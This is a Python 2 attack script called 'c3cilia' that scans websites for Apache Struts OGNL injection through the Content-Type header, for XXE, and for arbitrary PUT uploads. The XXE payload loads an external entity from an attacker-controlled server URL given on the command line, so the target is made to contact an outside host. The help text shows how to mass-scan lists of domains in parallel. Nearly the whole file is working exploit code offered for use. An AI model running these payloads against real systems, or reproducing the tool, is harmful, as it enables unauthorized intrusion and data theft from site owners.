#importing important lib 
import requests
import sys

blink = '\33[5m'
cyan ='\033[36m'
yellow ='\033[33m'

payload = '.multipart/form-data~%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("karthithehacker",4*4)}'
payload1 = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('karthithehacker',4*4)}.multipart/form-data"

head = {
        'User-Agent': 'c3cillia (https://github.com/karthi-the-hacker/c3cilia)',
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Content-Type': str(payload),
        'Accept': '*/*'
    }

head1 = {
        'User-Agent': 'c3cillia (https://github.com/karthi-the-hacker/c3cilia)',
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Content-Type': str(payload1),
        'Accept': '*/*'
    }

def banner():
	print (yellow)
	print " .-----------------------------.           "
	print " |  Hi Hackers                 |           "
	print (" |  Tool   : "+ cyan + "c3cilia           "+yellow+   "|")
	print " |  Author : @karthi_the_hacker|           "
	print " |           Jai Hind          |           "
	print " '-----------------------------'           "
	print "                 ^      (\_/)    "
	print "                 '----- (O.o)    "
	print "                        (> <)    "
	print " "


def psend():
	#getting CLI arg
	url = sys.argv[5]
	server = sys.argv[2]
	#setting data for post request
	proxies = {"http": "http://127.0.0.1:7777", "https": "http://127.0.0.1:7777"}
	header = {'Content-Type': 'test/xml'}
	typel = {'X-HTTP-Method-Override':'PUT'}
	agent = {'User-Agent': 'karthi_the_hacker'}
	entity = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % emails SYSTEM \"'
	entity += server + '\">'
	entity += '\r\n%emails;\r\n%content;\r\n]>\r\n<email>&emails;</email>'
	#sending post request
	x = requests.post(url, data=entity , proxies=proxies, headers=header , verify=False)
	print("> " + x.url + "  <---url") 
	print(x.request)
	print(x)
	print(x.headers) 
	#print(x.text)
	print(x.links)
	print("\n <-----------------------------------xxe scan-----------------------------------------------> \n")
	i = requests.post(url + "sample.html" , headers=typel , proxies=proxies, verify=False)
	print("> " + i.url + "  <---url") 
	print(i.request)
	print(i)
	print(i.headers) 
	#print(i.text)
	print(i.links)
	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
	r = requests.put(url + "sample.html", proxies=proxies , verify=False )
	print("> " + r.url + "  <---url") 
	print(r.request)
	print(r)
	print(r.headers) 
	#print(r.text)
	print(r.links)
	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
	s = requests.get(url , headers=head , proxies=proxies , verify=False )
	print("> " + r.url + "  <---url") 
	print(s.request)
	print(s)
	print(s.headers) 
	#print(s.text)
	print(s.links)
	print("\n <---------------------------------struck get scan-------------------------------------------------> \n")
	s1 = requests.get(url , headers=head1 , proxies=proxies , verify=False )
	print("> " + r.url + "  <---url") 
	print(s1.request)
	print(s1)
	print(s1.headers) 
	#print(s1.text)
	print(s1.links)
	print("\n <---------------------------------struck get 1 scan-------------------------------------------------> \n")
	sp = requests.post(url , headers=head , proxies=proxies , verify=False )
	print("> " + r.url + "  <---url") 
	print(sp.request)
	print(sp)
	print(sp.headers) 
	#print(sp.text)
	print(sp.links)
	print("\n <---------------------------------struck post scan-------------------------------------------------> \n")
	sp1 = requests.post(url , headers=head1 , proxies=proxies , verify=False )
	print("> " + r.url + "  <---url") 
	print(sp1.request)
	print(sp1)
	print(sp1.headers) 
	#print(sp1.text)
	print(sp1.links)
	print("\n <---------------------------------struck post 1 scan-------------------------------------------------> \n")


def send():
	#getting CLI arg
	url = sys.argv[4]
	server = sys.argv[2]
	header = {'Content-Type': 'test/xml'}
	typel = {'X-HTTP-Method-Override':'PUT'}
	agent = {'User-Agent': 'karthi_the_hacker'}
	entity = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % emails SYSTEM \"'
	entity += server + '\">'
	entity += '\r\n%emails;\r\n%content;\r\n]>\r\n<email>&emails;</email>'
	#sending post request
	x = requests.post(url, data=entity , headers=header , verify=False)
	print("> " + x.url + "  <---url") 
	print(x.request)
	print(x)
	print(x.headers) 
	#print(x.text)
	print(x.links)
	print("\n <---------------------------------xxe scan-------------------------------------------------> \n")
	i = requests.post(url + "sample.html", headers=typel , verify=False)
	print("> " + i.url + "  <---url") 
	print(i.request)
	print(i)
	print(i.headers) 
	#print(i.text)
	print(i.links)
	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
	r = requests.put(url + "sample.html")
	print("> " + r.url + "  <---url") 
	print(r.request)
	print(r)
	print(r.headers) 
	#print(r.text)
	print(r.links)
	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
	s = requests.get(url , headers=head , verify=False)
	print("> " + r.url + "  <---url") 
	print(s.request)
	print(s)
	print(s.headers) 
	#print(s.text)
	print(s.links)
	print("\n <---------------------------------struck get scan-------------------------------------------------> \n")
	s1 = requests.get(url , headers=head1 , verify=False)
	print("> " + r.url + "  <---url") 
	print(s1.request)
	print(s1)
	print(s1.headers) 
	#print(s1.text)
	print(s1.links)
	print("\n <---------------------------------struck get 1 scan-------------------------------------------------> \n")
	sp = requests.post(url , headers=head , verify=False)
	print("> " + r.url + "  <---url") 
	print(sp.request)
	print(sp)
	print(sp.headers) 
	#print(sp.text)
	print(sp.links)
	print("\n <---------------------------------struck post scan-------------------------------------------------> \n")
	sp1 = requests.post(url , headers=head1 , verify=False)
	print("> " + r.url + "  <---url") 
	print(sp1.request)
	print(sp1)
	print(sp1.headers) 
	#print(sp1.text)
	print(sp1.links)
	print("\n <---------------------------------struck post 1 scan-------------------------------------------------> \n")

def helpl():
	banner()
	print (cyan + "For single domain   : " + yellow + "python c3cilia.py --url http://yourserver.com/ --target https://target.com/")
	print (cyan + "For multiple domain : " + yellow + "cat live-domain.txt | xargs -n1 -p50 python c3cilia.py -u http://yourserver.com/ -t " + yellow)
	print (cyan + "For multiple domain with proxy : " + yellow + "cat live-domain.txt | xargs -n1 -p50 python c3cilia.py -u http://yourserver.com/ -p -t " + yellow)
	print (cyan + "For single domain with proxy   : " + yellow + "python c3cilia.py --url http://yourserver.com/ --proxy --target https://target.com/")
	

if (len(sys.argv)<=1):
	banner()
	print("You must provide a target. Use -h or --help for help.")
	print(" ")
	sys.exit()

if (str(sys.argv[1]) == "-h" or str(sys.argv[1]) == "--help"):
	helpl()
	sys.exit()

elif (len(sys.argv) == 5 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--url" and str(sys.argv[3]) == "-t" or str(sys.argv[3]) == "--target"):
	send()

elif (len(sys.argv) == 6 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--url" and str(sys.argv[3]) == "-p" or str(sys.argv[3]) == "--proxy" and str(sys.argv[4]) == "-t" or str(sys.argv[4]) == "--target"):
	print ("proxy")
	psend()
